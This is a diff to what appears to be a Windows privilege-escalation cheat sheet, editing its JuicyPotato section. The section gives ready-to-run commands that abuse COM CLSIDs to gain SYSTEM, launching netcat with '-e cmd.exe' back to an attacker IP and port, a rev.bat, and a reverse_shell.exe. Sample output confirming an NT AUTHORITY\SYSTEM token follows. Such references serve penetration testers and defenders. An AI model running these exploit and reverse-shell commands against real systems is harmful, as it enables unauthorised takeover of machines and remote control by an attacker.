@@ -721,9 +721,14 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
 3. Execute JuicyPotato to run a privileged command.
 
     ```powershell
-    juicypotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
-    juicypotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
-    # -l : local listener port
+    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
+        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+        ......
+        [+] authresult 0
+        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+        [+] CreateProcessWithTokenW OK
     ```
 
 ## EoP - Common Vulnerabilities and Exposure
